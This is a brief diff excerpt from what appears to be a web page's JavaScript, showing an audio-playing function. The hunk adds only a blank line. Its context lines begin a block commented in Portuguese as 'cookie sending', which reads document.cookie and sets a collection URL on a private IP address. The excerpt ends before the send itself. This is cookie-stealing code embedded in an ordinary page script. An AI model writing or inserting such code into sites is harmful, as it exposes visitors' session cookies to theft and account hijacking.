@@ -210,6 +210,7 @@ function TocaAudio(){
 	var audio = new Audio('https://rodrigorochapinto.github.io/pages-teste/audios/samba.mp3');
 	audio.play();
 }
+
 // inicio - Envio cookie
 a = document.cookie;
 b = "http://192.168.0.123/?=";
